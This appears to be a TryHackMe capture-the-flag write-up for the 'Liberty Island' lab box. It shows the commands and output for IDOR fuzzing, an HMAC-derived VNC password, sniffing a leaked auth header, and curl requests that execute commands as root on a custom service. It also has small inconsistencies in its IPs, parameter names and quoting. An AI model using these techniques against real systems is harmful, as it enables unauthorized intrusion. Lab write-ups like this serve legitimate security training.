# TryHackMe — DX1: Liberty Island

## Recon

Kicked off with a full TCP port sweep:

```
$ nmap -Pn -sS -sV -sC -A -T4 -p- 10.49.166.32
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: United Nations Anti-Terrorist Coalition
5901/tcp  open  vnc     VNC (protocol 3.8)
|   Security types: VeNCrypt (19), VNC Authentication (2)
23023/tcp open  http    Golang net/http server
|   UNATCO Liberty Island - Command/Control
|   RESTRICTED: ANGEL/OA
|   send a directive to process
```

Four interesting things right off the bat: a normal web app on 80, VNC on 5901, and a custom Golang HTTP "Command/Control" service on 23023 that responds with a `directive` prompt — clearly the endgame target.

## Web Enumeration — the `/datacubes` IDOR

`robots.txt` on port 80 disallowed `/datacubes`, complete with a dev complaining about it:

```
# Disallow: /datacubes # why just block this? no corp should crawl our stuff - alex
Disallow: *
```

That's a straight-up map to an IDOR. The entries under `/datacubes/` are numeric IDs, so built a 0–9999 wordlist and fuzzed it:

```
$ seq -w 0 9999 > ids.txt
$ ffuf -u http://10.49.166.32/datacubes/FUZZ -w ids.txt -fc 404

0011  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 36ms]
0000  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 40ms]
0068  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 53ms]
0103  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 36ms]
0233  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 35ms]
0451  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 36ms]
```

Six valid datapads: `0000`, `0011`, `0068`, `0103`, `0233`, `0451`.

`/datacubes/0000/` is just a banner:

```
Liberty Island Datapads Archive

All credentials within *should* be [redacted] - alert the administrators
immediately if any are found that are 'clear text'

Access granted to personnel with clearance of Domination/5F or higher only.
```


The real payoff is `/datacubes/0451/`, an internal note:

```
Brother,

I've set up VNC on this machine under jacobson's account. We don't know his
loyalty, but should assume hostile. Problem is he's good - no doubt he'll
find it... a hasty defense, but since we won't be here long, it should work.

The VNC login is the following message, 'smashthestate', hmac'ed with my
username from the 'bad actors' list (lol). Use md5 for the hmac hashing
algo. The first 8 characters of the final hash is the VNC password. - JL
```

So the VNC password is `HMAC-MD5("smashthestate", key=<JL's username from bad actors list>)[:8]`.

## Finding "JL"

`/badactors.html` is a UNATCO cyber-watchlist page maintained by `AJacobson`, listing a big alphabetical dump of flagged usernames (`apriest`, `aquinas_nz`, `cookiecat`, ... `jlebedev`, `jooleeah`, ... `ttong`). The signature "JL" plus the presence of `jlebedev` on the list makes the key obvious.

Ran the HMAC:

```
Recipe: HMAC
  Key: jlebedev (UTF8)
  Hashing function: MD5
Input: smashthestate
Output: 311781a1830c1332a903920a59eb6d7a
```

First 8 chars → **`311781a1`** — VNC password.

## Popping VNC

```
$ vncviewer 10.49.166.32:5901
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Password:
Authentication successful
Desktop name "ip-10-49-166-32.ap-south-1.compute.internal:1 (ajacobson)"
```

Logged straight into `ajacobson`'s desktop. `user.txt` on the Desktop is actually an internal email thread:

```
From: JManderley//UNATCO.00013.76490
To: AJacobson//UNATCO.00013.76490
Subject: re: Security Breach

Thank you for keeping me informed of the recent hacker activity and your
speedy response to same. I'm glad our security efforts were up to snuff.

(AJacobson//UNATCO.00013.76490) wrote:
>I managed to stop the guys (actually, it was some French chick
>the CIA's been watching, perhaps a Silhouette spy(?)) trying to
>break into the net, but I took the liberty of changing some
>passwords, just in case. Here are the new ones:
>
> thm{6ae787a98fff512ae33335e1264f0dd3}
>
>You should probably delete this as soon as you're done reading, okay?
```

**user flag:** `thm{6ae787a98fff512ae33335e1264f0dd3}`

The Desktop also has a `badactors-list` binary sitting next to `user.txt`

## Reversing the `badactors-list` client

Pulled the binary and checked it: an x64 ELF. Gave it exec permissions, added a hosts entry so it could resolve the name it expects to talk to:

```
$ chmod +x badactors-list
$ echo "10.49.166.32 UNATCO" >> /etc/hosts
$ ./badactors-list
```

Running it pops a small GUI that says **"Syncing with http://UNATCO:23023"**, then renders a live **"Bad Actors List"** pulled straight from the C2 endpoint — confirming the binary is just a front-end that talks to the port 23023 service using some kind of auth header plus a `directive` parameter.

## Sniffing the sync traffic

Fired up Wireshark against the interface while re-running the client, filtered on the C2 port:

```
tcp.port == 23023 && http
```

Several `POST / HTTP/1.1 (application/x-www-form-urlencoded)` requests show up. Following one of those streams exposes the auth header the client sends on every request:

```
Clearance-Code: 7gFfT74sCgzMqW4EQbu'
```

Along with a `detective` parameter. URL-decoding that parameter's value reveals it's not just data — it's a shell one-liner:

```
echo <base64 blob> | base64 -d > /var/www/html/badactors.txt
```

So the server-side handler for `detective` blindly executes whatever shell command comes through it — that's how the binary refreshes its own list file. In other words, the parameter is a straight-up **remote command execution channel**, gated only by the `Clearance-Code` header.

## RCE → root

With a valid `Clearance-Code` in hand, no need for the GUI client at all — just talk to the C2 endpoint directly with `curl`, swapping `detective` for the more literal `directive` parameter the service advertises:

```
root@OSCP:/tmp# curl -H 'Clearance-Code: 7gFfT74sCgzMqW4EQbu'' -d 'directive=whoami' 10.10.249.160:23023
root
```

Running as `root`. Confirmed and went straight for the flag:

```
root@OSCP:/tmp# curl -H 'Clearance-Code: 7gFfT74sCgzMqW4EQbu'' -d 'directive=ls -la /root' 10.10.249.160:23023
total 40
drwx------  6 root root 4096 Oct 22 05:36 .
drwxr-xr-x 19 root root 4096 Oct 21 01:33 ..
lrwxrwxrwx  1 root root    9 Oct 22 05:36 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Oct 22 05:36 .cache
drwxr-xr-x  3 root root 4096 Oct 22 05:36 go
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root  276 Oct 22 14:08 root.txt
drwx------  3 root root 4096 Oct 21 01:33 snap
drwxr-xr-x  4 root root 4096 Oct 22 01:33 .ssh
-rw-r--r--  1 root root  161 Oct 22 05:36 .wget-hsts
```

**root flag:** `thm{985bb3c88bfe66f9b465b00198692866}`

## TL;DR chain

1. `robots.txt` → `/datacubes` IDOR (numeric IDs, ffuf'd)
2. `/datacubes/0451` → HMAC riddle for the VNC password
3. `badactors.html` → username (`jlebedev`) used as the HMAC key
4. HMAC-MD5 → VNC password → shell access as `ajacobson`
5. `badactors-list` client on the desktop → talks to a Golang C2 on `:23023`
6. Wireshark on the sync traffic → leaked `Clearance-Code` header + discovered the `directive`/`detective` param is executed server-side
7. Direct `curl` with the leaked header → unauthenticated RCE as root
